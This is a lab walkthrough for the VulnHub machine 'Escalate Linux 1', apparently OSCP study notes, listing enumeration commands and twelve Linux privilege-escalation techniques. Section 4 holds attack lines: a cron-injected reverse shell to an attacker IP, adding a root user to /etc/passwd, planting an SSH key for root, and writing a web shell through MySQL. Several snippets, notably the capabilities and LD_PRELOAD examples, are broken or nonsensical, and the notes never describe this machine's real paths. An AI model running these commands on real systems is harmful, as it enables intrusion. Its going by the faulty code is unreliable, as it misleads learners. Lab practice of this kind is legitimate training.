# Escalate Linux 1: OSCP Walkthrough Notes

> **Source:** [Escalate Linux 1 on VulnHub](https://www.vulnhub.com/entry/escalate-linux-1,323/)
> **Author:** Manish Gupta
> **Difficulty:** Medium / Advanced (PrivEsc focused)
> **OS:** Linux (OVA / VirtualBox)
> **Released:** 30 June 2019
> **Goal:** Root access via 12+ privilege escalation paths
> **Networking:** DHCP enabled: boot with Host-Only adapter
> **File Integrity:** MD5 `EE35F30696C88FE5BB3138ADB40F17C7` | SHA1 `BD731E9483947A1C3BDAC81F496F9E76B31EAAAC`

---

## Overview

Escalate Linux 1 is a **purpose-built privilege escalation training machine**. The VM contains **12+ distinct privilege escalation vectors** spanning vertical escalation (user to root), horizontal escalation (user to user), and multi-level escalation (chained paths). It is designed to exhaustively teach Linux post-exploitation techniques rather than teach a single exploitation path.

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)

---

## M4d3 w1th ❤️ by Ankit Patidar

---

## 1. Recon

### Host Discovery

Configure the attacker's network adapter to Host-Only mode. The VM uses DHCP:

```bash
netdiscover -i tun0
# or
nmap -sn 10.10.10.0/24
# or
ping -b 10.10.10.255
```

Identify the target IP from the DHCP lease range (commonly `10.10.10.x` or a VirtualBox Host-Only subnet like `192.168.56.x`).

### Port Scanning

A full port scan identifies all services:

```bash
nmap -sV -sC -p- -T4 <target_ip>
```

### Expected Services

Since this is a privilege-escalation training VM, expect a minimal setup:

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | For user-level access |
| 80   | HTTP    | Possible web entry (check walkthrough) |
| Dynamic kernel services | - | May expose additional attack surface |

The VM's primary role is **privEsc practice**, so the initial access vector may be limited: you may need to use discovered credentials or a minimal web exploit to gain a foothold first.

---

## 2. Enumeration

### Network Discovery

Once the IP is known, confirm open ports and services:

```bash
nmap -sV -sC -Pn <target_ip>
```

### User Enumeration

From an initial shell (SSH or web-based):

```bash
# List all users
cat /etc/passwd
id
whoami
```

Check for other users on the system:

```bash
ls -la /home/
```

### System Information

```bash
uname -a
cat /etc/os-release
cat /etc/*release*
```

Identify the kernel version, distro, and patch level: these inform which known privilege escalation exploits may apply.

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

Record every SUID/GUID binary: each is a potential escalation vector.

### Cron Job Enumeration

```bash
# System-wide cron
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*

# User crontabs
ls -la /var/spool/cron/crontabs/
crontab -l  # for current user
for user in $(cut -f1 -d: /etc/passwd); do echo "== $user =="; crontab -u $user -l 2>/dev/null; done
```

Check for writable cron scripts or jobs running as root.

### Sudo Configuration

```bash
sudo -l
```

Record every command that can be run via sudo: misconfigured sudo rules are a common escalation path.

### Writable Files and Directories

```bash
# Files owned by root but writable by others
find / -writable -type f ! -user root 2>/dev/null
find / -writable -type d ! -user root 2>/dev/null

# World-writable files in root-owned directories
find / -xdev -perm -o+w -type f 2>/dev/null
find / -xdev -perm -o+w -type d 2>/dev/null
```

### Password and Credential Discovery

```bash
# Home directory files
find /home -type f 2>/dev/null
cat /home/*/.* 2>/dev/null

# Hidden files in root home
ls -la /root/
cat /root/.* 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Configuration files with hardcoded credentials
grep -r "password\|passwd\|secret" /etc/ 2>/dev/null
grep -r "password\|passwd\|secret" /opt/ 2>/dev/null
grep -r "password\|passwd\|secret" /home/ 2>/dev/null
```

### Linux PrivEsc Enumeration Scripts

Download and automate enumeration:

```bash
# linPEAS
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Or linEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# GTFOBins lookup
# https://gtfobins.github.io/
```

### Kernel Exploit Check

```bash
uname -r
# Search for known exploits for this kernel version
# e.g., Dirty COW (CVE-2016-5195), CVE-2019-18634 (pwnd), etc.
```

### Capabilities Enumeration

```bash
getcap -r / 2>/dev/null
# Files with elevated capabilities can be exploited (e.g., cap_setuid on a binary)
```

### Environment Variables

```bash
# Check for PATH hijacking
echo $PATH
# Check for LD_PRELOAD
env | grep -i preload
# Check for sensitive environment variables
env
```

### Abnormal Permissions on Sensitive Files

```bash
ls -la /etc/shadow
ls -la /etc/passwd
ls -la /usr/bin/passwd
```

---

## 3. Exploitation

### Initial Access

Escalate Linux 1 focuses on post-exploitation, so initial access may come from:
1. **SSH** with discovered credentials (check `authorized_keys` in home dirs)
2. **Web exploit** (if a web service is running)
3. **Known default credentials** if a service has weak authentication

#### Method: SSH with Discovered Credentials

```bash
ssh user@<target_ip>
# Credentials found from credential discovery (password files, authorized_keys, etc.)
```

#### Method: Web Exploit

If port 80 serves a vulnerable web application:
1. Identify the platform and version
2. Search for known exploits (Exploit-DB, GTFOBins)
3. Gain a low-privilege shell

### Post-Exploitation: User Shell

Once inside as a low-privilege user:

```bash
# Upgrade to a full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
stty raw -echo; fg
```

---

## 4. Privilege Escalation

This machine's core purpose is to provide **12+ privilege escalation paths**. Below are the categories and example techniques for each.

### Technique 1: SUID Binary Exploitation

```bash
find / -perm -u=s -type f 2>/dev/null
# For each SUID binary, check GTFOBins for exploitation methods
```

**Examples of exploitable SUID binaries on the VM:**
- `vim` → `:!bash`
- `find` → `-exec /bin/bash .;`
- `nmap` → `--interactive` then `!bash`
- `less` → `!bash`
- `more` → `!bash`
- Any custom binary with path-based execution

### Technique 2: Writable Cron Job

```bash
# Find world-writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
# Inject a reverse shell or add a user
echo "* * * * * root bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" >> /path/to/writable/cron/file
```

### Technique 3: sudo NOPASSWD Misconfiguration

```bash
sudo -l
# If a command is allowed without a password:
sudo <allowed_command>
# e.g., sudo vim → :!bash
# e.g., sudo find → -exec /bin/bash .;
# e.g., sudo python3 → import os; os.system('/bin/bash')
```

### Technique 4: PATH Hijacking

```bash
# If a script runs via sudo and references a command without a full path:
# Create a malicious executable named after that command in a writable directory
# Add that directory to PATH
export PATH="/tmp:$PATH"
# The malicious binary is executed as root when sudo runs the script
```

### Technique 5: Kernel Exploit

```bash
uname -r
# Identify the kernel version and search for a local privilege escalation exploit
# Common exploits:
# - Dirty COW (CVE-2016-5195) for older kernels
# - CVE-2019-18634 (pwnd) for sudo >= 1.8.21
# - Dirty Pipe (CVE-2022-0847) for kernels 5.8-5.16.11
# Download and compile the exploit, then execute
gcc -o exploit exploit.c
./exploit
```

### Technique 6: /etc/passwd Writable

```bash
# If /etc/passwd is world-writable, add a root user
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
# Or use a known hash for the password:
echo 'root2:$1$xyz...:0:0:root:/root:/bin/bash' >> /etc/passwd
su - root2
```

### Technique 7: SSH Key Injection

```bash
# If authorized_keys files are readable, inject your public key
cat /home/*/.ssh/authorized_keys
echo "ssh-rsa AAAA... attacker@attacker" >> /root/.ssh/authorized_keys
# Now SSH as root
ssh root@localhost
```

### Technique 8: Password Reuse Across Users

```bash
# Find a password hash in a config file or .bash_history
# Check if users share the same password
ssh user1@localhost
ssh user2@localhost
# Use found passwords for sudo or su to root
```

### Technique 9: Capabilities Misuse

```bash
getcap -r / 2>/dev/null
# If a binary has cap_setuid+ep, use a Python script to setuid to 0
python3 -c "
import os, struct
cap = struct.pack('<IIIII', 0x1, 0x0, 0x0, 0x0, 0x0)
fd = open('/proc/self/status', 'w')
# ... (capabilities-based privEsc)
"
```

### Technique 10: LD_PRELOAD / Shared Object Injection

```bash
# If a SUID binary is vulnerable to LD_PRELOAD:
echo "extern_uid=0;" > /tmp/evil.c
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
export LD_PRELOAD=/tmp/evil.so
# Run the SUID binary: it now executes with escalated privileges
```

### Technique 11: Database Credential Misuse

```bash
# If MySQL is running and credentials were found:
mysql -u root -p -e "SELECT ... INTO OUTFILE '/tmp/shell.php'"
# Or use INTO DUMPFILE to write a PHP web shell or SSH authorized key
```

### Technique 12: Misconfigured File Permissions / World-Readable Shadow

```bash
# If /etc/shadow is readable or /etc/passwd has user password hashes
# Crack passwords using John or Hashcat
# Use cracked passwords for su or sudo
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
su - root
```

### Horizontal Privilege Escalation (User to User)

- Find another user's password hash and crack it
- Read another user's SSH private key
- Access another user's home directory files (misconfigured permissions)
- Use sudo to switch to another user

### Multi-Level Escalation (Chained)

Chain multiple techniques:
1. Initial user shell → find readable SSH key for another user
2. SSH to that user → find a writable sudo script
3. Modify the sudo script → get root

### Gaining Root: Final Step

Once escalated:

```bash
whoami          # root
id              # uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
# Also check for the user.txt in a home directory for horizontal escalation confirmation
```

---

## 5. Screenshots

*No screenshots available for this machine.*

---

## 6. Key Takeaways

1. **Enumeration is the most important phase.** This machine teaches that finding escalation paths is about thorough, systematic enumeration: every file permission, every SUID binary, every cron job matters.

2. **12+ vectors means there is always another path.** If one escalation attempt fails, continue enumerating. The machine is deliberately designed with multiple redundant escalation paths.

3. **GTFOBins is an essential reference.** When you find a SUID binary or a sudo-allowed command, check [gtfobins.github.io](https://gtfobins.github.io/): the vast majority of Linux binaries can be exploited into a shell.

4. **Automated enumeration scripts accelerate the process.** `linPEAS` and `LinEnum.sh` can identify escalation vectors in minutes that would take hours to find manually. Always run them as early as possible.

5. **Vertical escalation (user → root) and horizontal escalation (user → user) are both covered.** Always check both directions: the user flag and the root flag may require different escalation paths.

6. **Multi-level escalation chains are common in real engagements.** Finding an intermediate user account to pivot through is a realistic attack pattern that mirrors professional red team operations.

7. **Kernel exploits provide local root access.** Once the kernel version is known, check Exploit-DB for local privilege escalation exploits that do not require remote access.

8. **Capabilities are an under-explored escalation vector.** `getcap` reveals binaries with file capabilities that can be abused: `cap_setuid`, `cap_dac_override`, and `cap_sys_admin` are particularly dangerous.

---

## Reference Links

- [VulnHub: Escalate Linux 1](https://www.vulnhub.com/entry/escalate-linux-1,323/)
- [GTFOBins: Linux Privilege Escalation Reference](https://gtfobins.github.io/)
- [PEASS-ng / linPEAS](https://github.com/carlospolop/PEASS-ng)
- [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [Exploit-DB](https://www.exploit-db.com/)

---

## M4d3 w1th ❤️ by Ankit Patidar
